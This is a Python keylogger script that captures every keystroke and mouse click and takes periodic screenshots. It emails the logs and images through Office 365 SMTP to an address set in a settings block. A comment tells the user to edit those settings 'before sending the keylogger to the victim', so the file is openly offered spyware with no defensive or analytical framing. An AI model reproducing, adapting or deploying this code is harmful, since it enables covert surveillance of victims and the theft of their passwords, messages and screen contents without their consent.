import os
import time
import random
import smtplib
import string
import base64
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from pynput import keyboard, mouse

global t, start_time, last_screenshot_time, pics_names, yourgmail, yourgmailpass, sendto, interval

t = ""
pics_names = []
last_screenshot_time = 0

# Note: You have to edit this part before sending the keylogger to the victim

######### Settings ########

# Settings for Outlook
yourgmail = "#############"  # Your Outlook email address
yourgmailpass = "##############"  # Your Outlook email password
sendto = "####################"  # Recipient email address
interval = 60  # Time to wait before sending data to email (in seconds)
log_limit = 5000  # Character limit for each log before sending
screenshot_interval = 30  # Time interval (in seconds) between screenshots
max_screenshots = 20  # Maximum number of screenshots to accumulate before sending

########################


def ScreenShot():
    global pics_names
    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    pics_names.append(name)
    screenshot = ImageGrab.grab()
    screenshot.save(name + '.png')


def Mail_it(data, pics):
    message = MIMEMultipart()
    message["Subject"] = "Keylogger Data"
    message["From"] = yourgmail
    message["To"] = sendto

    text = MIMEText(data, "plain")
    message.attach(text)

    for pic in pics:
        with open(pic + '.png', 'rb') as f:
            img = MIMEImage(f.read())
        img.add_header('Content-Disposition', 'attachment', filename=pic + '.png')
        message.attach(img)

    try:
        with smtplib.SMTP('smtp.office365.com', 587) as server:
            server.starttls()
            server.login(yourgmail, yourgmailpass)
            server.sendmail(yourgmail, sendto, message.as_string())
        # Remove sent images
        for pic in pics:
            os.remove(pic + '.png')
    except Exception as e:
        print(f"An error occurred while sending email: {e}")


def send_status_email():
    status_message = "Keylogger script has started successfully!"
    msg = MIMEText(status_message)
    msg['Subject'] = "Keylogger Status"
    msg['From'] = yourgmail
    msg['To'] = sendto
    try:
        with smtplib.SMTP('smtp.office365.com', 587) as server:
            server.starttls()
            server.login(yourgmail, yourgmailpass)
            server.sendmail(yourgmail, sendto, msg.as_string())
    except Exception as e:
        print(f"An error occurred while sending status email: {e}")


def on_click(x, y, button, pressed):
    global t, last_screenshot_time, pics_names
    if pressed:
        data = f'\n[{time.ctime().split(" ")[3]}] Button: {button}'
        data += f'\n\tClicked in (Position): ({x}, {y})'
        data += '\n===================='
        t += data
        if len(t) >= log_limit or (time.time() - last_screenshot_time) >= screenshot_interval:
            ScreenShot()
            last_screenshot_time = time.time()
        if len(t) >= log_limit or len(pics_names) >= max_screenshots:
            Mail_it(t, pics_names)
            t = ''
            pics_names.clear()


def on_press(key):
    global t, last_screenshot_time, pics_names
    try:
        data = f'\n[{time.ctime().split(" ")[3]}] Keyboard key: {key.char}'
        data += '\n===================='
    except AttributeError:
        data = f'\n[{time.ctime().split(" ")[3]}] Keyboard key: {key}'
        data += '\n===================='

    t += data
    if len(t) >= log_limit or (time.time() - last_screenshot_time) >= screenshot_interval:
        ScreenShot()
        last_screenshot_time = time.time()
    if len(t) >= log_limit or len(pics_names) >= max_screenshots:
        Mail_it(t, pics_names)
        t = ''
        pics_names.clear()


start_time = time.time()

# Setup the listener threads
mouse_listener = mouse.Listener(on_click=on_click)
keyboard_listener = keyboard.Listener(on_press=on_press)

# Start the listeners
mouse_listener.start()
keyboard_listener.start()

# Send status email upon script launch
send_status_email()

# Keep the script running
mouse_listener.join()
keyboard_listener.join()
